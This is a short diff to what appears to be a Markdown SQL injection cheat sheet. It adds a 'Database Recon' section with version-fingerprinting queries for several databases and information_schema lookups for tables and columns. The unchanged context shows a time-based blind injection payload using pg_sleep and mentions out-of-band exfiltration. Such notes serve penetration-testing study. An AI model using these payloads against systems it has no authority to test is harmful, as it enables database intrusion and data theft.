@@ -30,3 +30,15 @@
         `'…' OR pg_sleep(10)--` 
         Observe 10s delay. 
     - **Out-of-band (OAST)**: trigger DNS/HTTP to exfiltrate.
+
+### Database Recon
+- Query version:
+    - SQL Server/MySQL: `SELECT @@version`
+    - PostgreSQL: `SELECT version()`
+    - Oracle: `SELECT * FROM v$version`
+        
+- Inspect schema:
+    
+    - `information_schema.tables` → list tables.
+        
+    - `information_schema.columns WHERE table_name='X'` → columns.
